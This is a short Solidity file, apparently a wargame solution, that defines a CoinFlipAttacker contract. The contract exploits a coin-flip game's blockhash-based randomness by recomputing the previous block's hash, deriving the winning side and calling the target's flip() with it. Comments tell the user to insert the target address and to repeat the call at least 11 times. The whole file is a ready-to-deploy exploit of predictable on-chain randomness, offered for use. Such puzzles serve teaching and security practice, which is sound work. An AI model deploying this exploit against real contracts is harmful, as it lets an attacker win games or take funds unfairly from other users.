// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttacker {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    //Here you need to change CoinFlip address. You will have a different addresss
    CoinFlip public mainContract = CoinFlip(0x7A0fCAA3Cf7a3bF5f7f011Cd09Bd0f3A4992c6be);

    //Once you deploy, call this function at least 11 times. 
    //Sometimes you might have errors. You can ignore those errors and call it again. 
  function flipAttacker() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    mainContract.flip(side);
  }
  
}